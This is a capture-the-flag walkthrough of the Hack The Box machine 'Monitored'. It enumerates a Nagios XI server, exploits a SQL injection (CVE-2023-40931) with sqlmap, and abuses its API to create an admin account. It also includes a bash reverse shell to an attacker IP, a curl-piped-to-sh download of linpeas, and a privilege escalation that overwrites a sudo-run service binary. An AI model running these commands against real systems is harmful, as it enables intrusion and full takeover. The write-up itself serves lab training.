---
date: 2025-03-29
categories: [CTF, HTB]
title: "HTB - Monitored"
tags: ['john the ripper', 'linux', 'nmap', 'privilege escalation', 'rce', 'sqli', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Monitored - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Monitored

- NMAP

![image1](../resources/8ea41708e1a347838e2ecc7dcd99becc.png)
 

![image2](../resources/e6df9cb7edd8466d968c4c49a08621c8.png)

- UDP Scan:

```bash
sudo nmap nagios.monitored.htb -sU -vvv

```

![image3](../resources/eacb9a0de29e4b7189ee1591c00b2783.png)

- Add **nagios.monitored.htb** to /etc/hosts

![image4](../resources/8e8dd8290a674cbf9cabad4c56a7f599.png)


![image5](../resources/3af82cbb6a11423cb3f8583570ed4c75.png)

- Directory bruteforcing:

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

![image6](../resources/bc900ed4da4b4fd39323f7aeef86e354.png)

- FUZZ /api

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![image7](../resources/5fdc96e42a38471b8606c830ed6f9fd1.png)

- FUZZ /v1
/v1 is an indicator of version controlled endpoints:

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

![image8](../resources/4eb051283fd84c1cb89fb3f980e97464.png)


![image9](../resources/b9798d5323c44d9ca9b6979b59630b1c.png)

- Filter:

```bash
ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 4

```

![image10](../resources/0fd8e28137c646f0926de32d8e84d801.png)

- **Incorrectly** formatted POST request:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"test": "test"}' -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate

```

![image11](../resources/13db6c1a03a0429abfa6cec1b37439bf.png)

- After looking at the Login page POST request - we can see two things:
The Content-Type and

how the username and password is being sent as parameters


![image12](../resources/763822713dd443ac8fa994b666ad3c31.png)

- Correctly formatted POST request:
Can include **-H "Content-Type: application/x-www-form-urlencoded"** but isn't necessary

```bash
curl -X POST -d "username=test&password=test" -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate

```

![image13](../resources/86406ddfec7d446ba1da6519f1e33fa5.png)

- **<u>SNMP:</u>**
SNMPv1: Authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text)


![image14](../resources/d1d4ebcc8065455c9e4fd246d0c6bb87.png)

- From the NMAP scan we can see it's SNMP v1 and the community string is **public**

- Check login with Metasploit (and we get the Community String - **public**) as well

![image15](../resources/fad0a1c4693c4b94a899e5caa986b9e6.png)

```bash
snmpwalk -c public 10.129.230.96 -v 1

```

![image16](../resources/70e2a1aa7cab42a1833f05cdc26c47a1.png)

```bash
sudo apt install snmp-mibs-downloader

```
```bash
sudo nano /etc/snmp/snmp.conf #comment out mibs
```

![image17](../resources/e1d68378873045fdae5b8151d5e13f87.png)

- Now it shows the names:

![image18](../resources/b3760f29f86c4d0e9288e23feaa33d69.png)

- Let snmpwalk run and output to a file:

```bash
snmpwalk -c public 10.129.230.96 -v 1 > snmp.txt

```
- SNMP-Check:
The output format is much better

```bash
snmp-check 10.129.230.96

```

![image19](../resources/6d4d893af32c47b9a2976f2d25bc302b.png)

- Found a potential username and password - looking at services:

![image20](../resources/dfff28587e99445697e96c0a269c44ff.png)

**svc : XjH7………**

- Tried to login at the login page and SSH with it but it doesn't work, as well as /terminal:

![image21](../resources/12b53e98840e475d8589e9cf371ad14e.png)

- Try to login to the API:

```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=svc&password=<password>" -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate

```

![image22](../resources/830444d610d6494a86cb2d4194829beb.png)

Auth_token: **815a6e02614c74f9bce2bd585298b5efa0858d6d**

- Auth tokens expire if not used

- Look at Nagios docs:
<https://www.nagios.org/ncpa/help/2.0/api.html>

- Go to:
[**https://nagios.monitored.htb/nagiosxi/?token=\<token\>**](https://nagios.monitored.htb/nagiosxi/?token=%3ctoken%3e)

<https://nagios.monitored.htb/nagiosxi/?token=815a6e02614c74f9bce2bd585298b5efa0858d6d>


![image23](../resources/56cd9f0d770f4079b0b4dd54fd93101f.png)


![image24](../resources/064ac36d1b9c4aaba8b18dc61178098d.png)

- Searching on google for Nagios 5.11.0 exploit - There seems to be a SQLi exploit (CVE-2023-40931)
<https://outpost24.com/blog/nagios-xi-vulnerabilities/>


![image25](../resources/7e06963ce0b14d8e88e5cae85e8d7157.png)

- SQLmap:

![image26](../resources/21b626457f8a4fbc911d64179c855617.png)


![image27](../resources/71e6009872a44892a82fc31549a995b4.png)

- It needs to be a cookie of an authenticated user

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="action=acknowledge_banner_message&id=3" --cookie "nagiosxi=q0mkm8crf2a3rckum3enqgafje" --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump

```

![image28](../resources/b47c1bc297dc43dd9f7606da3379a701.png)

nagiosadmin : \$2a\$10\$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C

API_Key : IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

- The hash is a bcrypt hash:

![image29](../resources/b957130d83f04e00a448693df95a8f56.png)

- Couldn't crack it with rockyou.txt

- Maybe the api_key is for the API endpoints

- Looking for API docs:
<https://support.nagios.com/forum/viewtopic.php?t=42923>

<https://support.nagios.com/kb/article/nagios-xi-how-to-apply-configuration-using-the-api-697.html>

- Changing the parameter to **?apikey=** seems to give a different error

![image30](../resources/f235a14251f3429e876cc16a9fd1ef49.png)

- We can maybe look at Admin stuff - with the **/api/v1/system**:
<https://nagios.monitored.htb/nagiosxi/api/v1/system/status?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL>


![image31](../resources/8fb56ca8b8f542a4a75dab079ce9fda0.png)

- Got something different back

/user


![image32](../resources/8dc949542ec945968ad65f2332bdc71f.png)

- According to the article above, we can do something like this:

```bash
curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin1&password=password1&name=john%20smit&email=john@localhost"

```

![image33](../resources/67c6b946fecd429793abeeda4d600277.png)

- Added a user:

![image34](../resources/843d1d7812a046c1b230e6eaec2307c5.png)

But it's just a user

- Go to this site and click on Administrator -\> Help -\> System Reference
<https://nagiosxi.demos.nagios.com/nagiosxi/>


![image35](../resources/ccc32aaab3d04c43b5a1f6b4d3d45da9.png)

Auth_level is by default = user

- Change auth_level = admin:

```bash
curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin&password=admin&auth_level=admin&name=john%20smit&email=john2@localhost"

```

![image36](../resources/fdca44163aa345c5b8d3ff0ed883dbed.png)

- Log in to nagiosxi

![image37](../resources/458e7e1764d740688bde4debaa4e3b1d.png)

- We have an admin panel

<https://assets.nagios.com/downloads/nagiosxi/docs/How-To-Use-The-Actions-Component-in-Nagios-XI.pdf>

Configure -\> Core Config Manager -\> Commands -\> Add New


![image38](../resources/087d220e093b4216b8a817ebe89c2632.png)

Input a rev shell


![image39](../resources/114085a8f96a4999a6e92b3d4386a7ff.png)

. -\> Quick Tools -\> Apply configuration

.-\> Monitoring -\> Services


![image40](../resources/cdc9a55c883e46b4a9e2672eca5349a7.png)

- Pick one and edit:
Choose the command we made


![image41](../resources/e20dd4f0c1bb453787aef3835513f02f.png)

- Set up listener on Kali

- . -\> Quick Tools -\> Apply configuration

- Shell:

![image42](../resources/0af06f60661c49f8808725c5fbaed029.png)

- The shell is temperamental but if it drops out, just restart the listener and wait or
in Services, choose your service and click Run Check Command and stop the command after you get a shell

- To get a better shell:

```bash
ssh-keygen -t rsa -b 4096

chmod 600 id_rsa

echo "id_rsa.pub" > .ssh/authorized_keys

ssh nagios@10.129.230.96 -i id_rsa

```

![image43](../resources/239aec1f148c454ca2a823e6c771d638.png)

**<u>Priv esc:</u>**

```bash
sudo -l

```

![image44](../resources/7ed1a3f29edb426cbe4867e5eadd6adf.png)

- Upload linpeas:

```bash
curl http://10.10.14.38:8082/linpeas.sh | sh

```

![image45](../resources/20e33d20de5a4343b29ba0fade487521.png)

- Looking at the services from linpeas:

```bash
systemctl status nagios.service

```

![image46](../resources/303b1d93a60f4ea1892a1fc682face5b.png)

- Reading the script **manage_services.sh**
We can see that it's a script that basically does what systemctl does - starts and stops services and looks at the status


![image47](../resources/45d63ade3e854f8e8b55d195eb804270.png)

- We have sudo rights to run this script with **wilcard \*** arguments

- Looking at the list of services that we can start/ stop - **ncpd** stands out because we can write to that executable


![image48](../resources/e6992bf6b8774299b91d745ab26532e9.png)

**Everything in Linux is a file**

- Set up listener:

```bash
rlwrap -cAr nc -lvnp 9001

```
- Do the following:

```bash
rm -rf /usr/local/nagios/bin/npcd

nano /usr/local/nagios/bin/npcd

#!/bin/bash
bin/bash -i >& /dev/tcp/10.10.14.38/9001 0>&1
chmod +x /usr/local/nagios/bin/npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
```

![image49](../resources/6dafc92d6dde4a738d4320012e337f5b.png)


![image50](../resources/0c5aad1dde79416d983de8bc22a48939.png)


![image51](../resources/89436fc864c54ae6919b36924a6910d7.png)


![image52](../resources/e851b0e6717b4798bc5e3441d3bcbda7.png)


![image53](../resources/ef388230d13b4ddcbdbdfe8c574eafc1.png)